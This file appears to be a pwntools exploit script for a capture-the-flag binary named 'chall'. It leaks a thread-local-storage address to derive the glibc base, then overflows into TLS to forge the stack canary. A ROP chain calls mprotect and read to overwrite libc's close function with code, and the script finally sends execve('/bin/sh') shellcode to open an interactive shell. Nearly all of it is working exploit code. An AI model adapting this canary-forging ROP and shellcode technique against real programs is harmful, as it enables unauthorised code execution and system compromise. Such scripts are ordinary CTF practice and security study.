#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *


se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p.pid + 1, gdbscript)
    time.sleep(1)

elf = ELF("./chall")
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
p = process("./chall")

def echo(data):
    sl("echo")
    se(data)

## 1. leak glibc address
stack_tls_offset = 0x100
tls_to_libc_offset = 0x39c0

echo("a" * stack_tls_offset)
ru("a" * stack_tls_offset)
tls_addr = u64(rc(6) + b'\x00\x00')
libc_base = tls_addr + tls_to_libc_offset
success(hex(libc_base))

read_addr = libc_base + 0x1145e0
open_addr = libc_base + 0x1142f0
close_addr = libc_base + 0x114d60
mprotect_addr = libc_base + 0x11e8b0
pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x2be51
pop_rdx = libc_base + 0x796a2
ret = libc_base + 0x2a3e6

# pause()
# debug(0x1a10)
# debug(0x18f8)

## 2. rop while overflow tls
tls_offset = 0x910
gadget = b"/flag.txt\x00"
gadget += b"a" * (0x108 - len(gadget))  ## pading
gadget += b"deedbeef"  ## canary
gadget += b"a" * 0x8   ## rbp
gadget += p64(ret)     ## return

## mprotect(&close, 1000, 7)
gadget += p64(pop_rdi) + p64(libc_base + 0x114000)
gadget += p64(pop_rsi) + p64(0x1000)
gadget += p64(pop_rdx) + p64(7)
gadget += p64(mprotect_addr)

## read(0, &close, 0x100)
gadget += p64(pop_rdi) + p64(0)
gadget += p64(pop_rsi) + p64(close_addr)
gadget += p64(pop_rdx) + p64(0x100)
gadget += p64(read_addr)

## open("flag.txt", 0), triger seccomp sandbox
gadget += p64(open_addr)

## padding to tls
gadget += b"\x00" * (tls_offset - len(gadget))

## forging tls
gadget += p64(tls_addr)
gadget += p64(tls_addr + 0x100)
gadget += p64(tls_addr)
gadget += p64(1)
gadget += p64(0)
gadget += b"deedbeef"
echo(gadget)

shellcode = f'''
	xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	cdq
	syscall
'''
shellcode = asm(shellcode)

## make sure the parent process block on reading command
ru("ome, sent: 9 bytes")
ru("Enter command")
se(shellcode)
se(shellcode)

p.interactive()